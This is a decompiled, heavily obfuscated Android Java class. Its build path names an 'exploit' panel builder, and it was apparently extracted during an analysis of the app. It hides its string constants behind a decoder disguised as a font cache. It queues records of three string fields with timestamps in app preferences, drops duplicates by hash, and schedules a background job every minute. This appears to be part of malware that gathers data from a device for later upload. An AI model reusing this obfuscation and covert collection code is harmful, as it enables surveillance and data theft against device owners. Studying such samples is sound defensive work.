package v.s;

import android.content.Context;
import android.content.SharedPreferences;
import app.mobilex.plus.util.TypefaceCache;
import java.security.MessageDigest;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class WMx7O1yIuvMieNw {
    public static volatile boolean Ee8d2j4S9Vm5yGuR;
    public static final String JXn4Qf7zpnLjP5;
    public static final WMx7O1yIuvMieNw dDIMxZXP1V8HdM = new WMx7O1yIuvMieNw();
    public static final String vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;
    public static volatile long xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("001600620052008B00C2008B00E600A60030007D");
        w9sT1Swbhx3hs = TypefaceCache.obtain("0030007B004800B800E100AA00D700B20026");
        vekpFI4d1Nc4fakF = TypefaceCache.obtain("003300730055008300F900B100D5");
        JXn4Qf7zpnLjP5 = TypefaceCache.obtain("00270073005F009200E0008000DA00A60030007E005E0094");
    }

    public static void JXn4Qf7zpnLjP5(Context context) {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (!Ee8d2j4S9Vm5yGuR || jCurrentTimeMillis - xDyLpEZyrcKVe0 >= 60000) {
            Ee8d2j4S9Vm5yGuR = true;
            xDyLpEZyrcKVe0 = jCurrentTimeMillis;
            y6jRGLEWNMir.b1EoSIRjJHO5(jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(umMdYoePNXvWWPn.w9sT1Swbhx3hs), null, new y4LCh4QbmhUf21TiMhU(context, null), 3);
        }
    }

    public static final JSONObject dDIMxZXP1V8HdM(Context context) {
        JSONArray jSONArray;
        JSONObject jSONObjectOptJSONObject;
        synchronized (dDIMxZXP1V8HdM) {
            try {
                jSONArray = new JSONArray(context.getSharedPreferences(w9sT1Swbhx3hs, 0).getString(vekpFI4d1Nc4fakF, "[]"));
            } catch (Exception unused) {
                jSONArray = new JSONArray();
            }
            jSONObjectOptJSONObject = jSONArray.length() > 0 ? jSONArray.optJSONObject(0) : null;
        }
        return jSONObjectOptJSONObject;
    }

    public static final void w9sT1Swbhx3hs(Context context) {
        JSONArray jSONArray;
        synchronized (dDIMxZXP1V8HdM) {
            SharedPreferences sharedPreferences = context.getSharedPreferences(w9sT1Swbhx3hs, 0);
            try {
                jSONArray = new JSONArray(sharedPreferences.getString(vekpFI4d1Nc4fakF, "[]"));
            } catch (Exception unused) {
                jSONArray = new JSONArray();
            }
            if (jSONArray.length() > 0) {
                jSONArray.remove(0);
            }
            sharedPreferences.edit().putString(vekpFI4d1Nc4fakF, jSONArray.toString()).apply();
        }
    }

    public final boolean Ee8d2j4S9Vm5yGuR(Context context, String str, String str2, long j) {
        JSONArray jSONArray;
        String strEuF5Udt5Rqv3Qmea = imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(VnDsNIgXNCQywv8lGh.jdOQeRk37T35X5xKW1P(MessageDigest.getInstance(TypefaceCache.obtain("0010005E007A00CA00A200EA0084")).digest((str + "|" + str2 + "|" + (j / ((long) (1078 - 78)))).getBytes(N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM)), 8), "", ofxQWGnngPxGI3OtvQn.Qrz92kRPw4GcghAc, 30);
        long jCurrentTimeMillis = System.currentTimeMillis();
        SharedPreferences sharedPreferences = context.getSharedPreferences(w9sT1Swbhx3hs, 0);
        synchronized (this) {
            try {
                jSONArray = new JSONArray(sharedPreferences.getString(JXn4Qf7zpnLjP5, "[]"));
            } catch (Exception unused) {
                jSONArray = new JSONArray();
            }
            JSONArray jSONArray2 = new JSONArray();
            int length = jSONArray.length();
            boolean z = false;
            for (int i = 0; i < length; i++) {
                JSONObject jSONObjectOptJSONObject = jSONArray.optJSONObject(i);
                if (jSONObjectOptJSONObject != null && jCurrentTimeMillis - jSONObjectOptJSONObject.optLong("t", 0L) <= 30000) {
                    jSONArray2.put(jSONObjectOptJSONObject);
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(jSONObjectOptJSONObject.optString("h"), strEuF5Udt5Rqv3Qmea)) {
                        z = true;
                    }
                }
            }
            if (z) {
                return true;
            }
            while (jSONArray2.length() >= 500) {
                jSONArray2.remove(0);
            }
            jSONArray2.put(new JSONObject().put("h", strEuF5Udt5Rqv3Qmea).put("t", jCurrentTimeMillis));
            sharedPreferences.edit().putString(JXn4Qf7zpnLjP5, jSONArray2.toString()).apply();
            return false;
        }
    }

    public final void vekpFI4d1Nc4fakF(Context context, String str, String str2, String str3, Long l) {
        JSONArray jSONArray;
        synchronized (this) {
            SharedPreferences sharedPreferences = context.getSharedPreferences(w9sT1Swbhx3hs, 0);
            try {
                jSONArray = new JSONArray(sharedPreferences.getString(vekpFI4d1Nc4fakF, "[]"));
            } catch (Exception unused) {
                jSONArray = new JSONArray();
            }
            while (jSONArray.length() >= 1000) {
                TypefaceCache.obtain("001600620052008B00C2008B00E600A60030007D");
                TypefaceCache.obtain("00120063005E009200F500FF00DD00B100260064005D008B00FF00A8009200EF");
                jSONArray.length();
                TypefaceCache.obtain("006A003A001B008300E200B000C200B7002A0078005C00C700FF00B300D600A200300062001B00B400DD008C");
                jSONArray.remove(0);
            }
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(TypefaceCache.obtain("003000730055008300F500AD"), str);
            jSONObject.put(TypefaceCache.obtain("002E00730048009400F100B800D7"), str2);
            jSONObject.put(TypefaceCache.obtain("0030007B004800B800E400A600C200A2"), str3);
            jSONObject.put(TypefaceCache.obtain("0030007F005600B800E300B300DD00B3"), 0);
            jSONObject.put(TypefaceCache.obtain("0037007F0056008200E300AB00D300AA0033"), l.longValue());
            jSONObject.put(TypefaceCache.obtain("00320063005E009200F500BB00ED00A60037"), System.currentTimeMillis());
            jSONArray.put(jSONObject);
            sharedPreferences.edit().putString(vekpFI4d1Nc4fakF, jSONArray.toString()).apply();
        }
    }
}
